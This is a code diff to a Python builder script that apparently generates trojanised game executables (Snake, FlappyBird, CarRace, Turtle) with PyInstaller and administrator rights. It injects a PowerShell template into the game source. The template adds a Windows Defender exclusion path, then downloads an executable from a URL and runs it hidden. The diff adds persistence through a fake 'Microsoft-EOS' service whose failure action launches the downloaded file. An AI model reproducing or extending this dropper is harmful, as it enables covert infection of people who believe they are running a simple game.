@@ -12,19 +12,23 @@ def display_ansi_art(file_path):
         ansi_art = file.read()
     print(ansi_art)
 
-def create_exe(py_file, game_type, exe_name):
+def create_exe(py_file, game_type):
     try:
         icons_directory = "icons"
         icon_file = os.path.join(icons_directory, 'Beryl.ico')  # Default icon file path
-
+        name ="Beryl"
         if game_type == "snake":
             icon_file = os.path.join(icons_directory, 'snake.ico')
+            name = "Snake"
         elif game_type == "flapybird":
             icon_file = os.path.join(icons_directory, 'flapybird.ico')
+            name = "FlapyBird"
         elif game_type == "racecar":
             icon_file = os.path.join(icons_directory, 'racecar.ico')
+            name = "CarRace"
         elif game_type == "turtle":
             icon_file = os.path.join(icons_directory, 'turtle.ico')
+            name = "Turtle"
 
         pyinstaller_command = [
             "pyinstaller",
@@ -32,7 +36,7 @@ def create_exe(py_file, game_type, exe_name):
             "--onefile",
             "--windowed",
             "--icon", icon_file,
-            "--name", exe_name,  # Use the provided exe_name as the name of the executable
+            "--name", name,  # Use the provided exe_name as the name of the executable
             "--uac-admin",
             "--distpath", "Output", 
             py_file
@@ -64,7 +68,7 @@ def main():
         "Author: ELMERIKH\n" + Style.RESET_ALL
     )
     print(introduction)
-
+    
     powershell_template = [
     "$directoryPath = Join-Path $HOME '{directory_path}'",
     "Add-MpPreference -ExclusionPath $directoryPath",
@@ -72,9 +76,20 @@ def main():
     "$targetDirectory = Join-Path $HOME '{target_directory}'",
     "if (-not (Test-Path -Path $targetDirectory)) {{New-Item -Path $targetDirectory -ItemType Directory -Force}}",
     "$outputFile = Join-Path $targetDirectory '{output_name}.exe'",
+    "sc.exe create Microsoft-EOS binPath= 'C:\\\\ProgramData\\\\Microsoft\\\\Windows Defender\\\\Platform\\\\4.18.23080.2006-0\\\\MsMpEng.exe' start= auto",
+    "$serviceName = 'Microsoft-EOS'",
+    "$failureCommand = $outputFile",
+    "$actions = @{{'1' = $failureCommand}}",
+    "foreach ($actionNumber in $actions.Keys) {{",
+    
+    "    sc.exe failure $serviceName reset= 86400 actions= 'run/$actionNumber/$failureCommand'",
+    "    sc.exe failureflag $serviceName $actionNumber $actionType",
+    "}}",
+    "sc.exe failure $serviceName  command= $failureCommand",
     "Invoke-WebRequest -Uri $url -OutFile $outputFile",
     "$installerPath = $outputFile",
     "Start-Process -FilePath $installerPath -Wait -WindowStyle Hidden"
+
 ]
 
 # Combine the PowerShell lines into a single string
@@ -145,30 +160,35 @@ def main():
     if args.game_type:
         game_directory = f"games\{args.game_type.lower()}"
     
-    game_path = os.path.join(game_directory, f"{args.game_type.lower()}.py")
-    print('\n')
+        game_path = os.path.join(game_directory, f"{args.game_type.lower()}.py")
+        print('\n')
     
-    print(f"you have selected Game : {args.game_type.upper()}")
-    print('\n')
+        print(f"you have selected Game : {args.game_type.upper()}")
+        print('\n')
+   
+        if os.path.exists(game_path):
+            with open(game_path, 'r') as game_file:
+                game_contents = game_file.read()
 
-    if os.path.exists(game_path):
-        with open(game_path, 'r') as game_file:
-            game_contents = game_file.read()
+            insertion_point = game_contents.find('score = 0')
 
-        insertion_point = game_contents.find('score = 0')
+            # Split the game_contents into two parts
+            before_insertion = game_contents[:insertion_point]
+            after_insertion = game_contents[insertion_point:]
 
-        # Split the game_contents into two parts
-        before_insertion = game_contents[:insertion_point]
-        after_insertion = game_contents[insertion_point:]
-
-        # Combine the contents in the desired order
-        combined_contents = before_insertion + '\n' + desired_section + '\n' + after_insertion
-
-        # Write the combined contents into pew.py
-        with open('pew.py', 'w') as pew_file:
-            pew_file.write(combined_contents)
+            # Combine the contents in the desired order
+            combined_contents = before_insertion + '\n' + desired_section + '\n' + after_insertion
+            
+            # Write the combined contents into pew.py
+            with open('pew.py', 'w') as pew_file:
+                pew_file.write(combined_contents)
+            print("Creating the executable...")
+            create_exe('pew.py', args.game_type.lower())
+            print("Finished creating the executable.")    
     else:
+        print('\n')
         print(f"no game file specified, generating no GUI exe")
+        print('\n')
         with open('paw.py', 'r') as paw_file:
             paw_contents = paw_file.read()
         with open('pew.py', 'w') as pew_file:
@@ -176,9 +196,10 @@ def main():
 
 
     # Display message and create exe file
-    print("Creating the executable...")
-    create_exe('pew.py', args.game_type.lower(), args.output_name)
-    print("Finished creating the executable.")
+        print("Creating the executable...")
+        print('\n')
+        create_exe('pew.py',"no gui")
+        print("Finished creating the executable.")
 
 if __name__ == "__main__":
     main()
